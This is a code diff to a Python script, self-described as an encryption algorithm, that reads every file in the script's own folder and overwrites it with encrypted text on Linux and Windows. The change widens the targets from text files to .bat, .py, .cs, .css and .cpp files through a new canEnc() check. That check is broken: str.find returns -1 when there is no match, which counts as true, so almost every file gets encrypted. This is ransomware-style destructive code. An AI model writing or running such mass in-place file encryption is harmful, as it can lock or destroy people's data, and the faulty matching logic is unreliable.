@@ -21,6 +21,7 @@ char = [] #All Characters
 storedkeylist = []
 bytesc = str(random.randint(1000000000000000,9999999999999999999))
 randName = hashlib.md5(bytes(bytesc, "ascii")).hexdigest() + ".py"
+types = [".txt",".text",".bat",".py",".cs",".css",".cpp"]
 
 print("Using GAR-EncryptionAlgorithem --V1.3 --By:2Depth --OpenSource-Version")
 
@@ -40,6 +41,12 @@ for keyNum in range(len(string.printable)):
     StoredKey = StoredKey + str(storedkeylist[keyNum])
 
 #Encrypt
+
+def canEnc(name):
+   for num in range(len(types)):
+      if types[num].find(name):
+         return True
+   return False
 
 def encrypt(txt):
     started = txt
@@ -112,7 +119,7 @@ if ods == "Linux":
     fils = os.listdir(Path(__file__).parent)
     for fl in range(len(fils)):
         if fils[fl] != randName:
-            if fils[fl].find(".txt") or fils[fl].find(".text"):
+            if canEnc(fils[fl]):
                 padir = str(Path(__file__).parent) + "/"
                 toEncFlW = Path(padir+ "/" + fils[fl])
                 daya = str(toEncFlW.read_text())
@@ -126,7 +133,7 @@ else:
     fils = os.listdir(Path(__file__).parent)
     for fl in range(len(fils)):
         if fils[fl] != randName:
-            if fils[fl].find(".txt") or fils[fl].find(".text"):
+            if canEnc(fils[fl]):
                 padir = str(Path(__file__).parent) + "\\"
                 toEncFlW = Path(padir+ "\\" + fils[fl])
                 daya = toEncFlW.read_text()
@@ -154,7 +161,7 @@ def check():
             fils = os.listdir(Path(__file__).parent)
             for fl in range(len(fils)):
                 if fils[fl] != randName:
-                    if fils[fl].find(".txt") or fils[fl].find(".text"):
+                    if canEnc(fils[fl]):
                         padir = str(Path(__file__).parent) + "/"
                         toEncFlW = Path(padir+ "/" + fils[fl])
                         daya = str(toEncFlW.read_text())
@@ -167,7 +174,7 @@ def check():
             fils = os.listdir(Path(__file__).parent)
             for fl in range(len(fils)):
                 if fils[fl] != randName:
-                    if fils[fl].find(".txt") or fils[fl].find(".text"):
+                    if canEnc(fils[fl]):
                         padir = str(Path(__file__).parent) + "\\"
                         toEncFlW = Path(padir+ "\\" + fils[fl])
                         daya = str(toEncFlW.read_text())
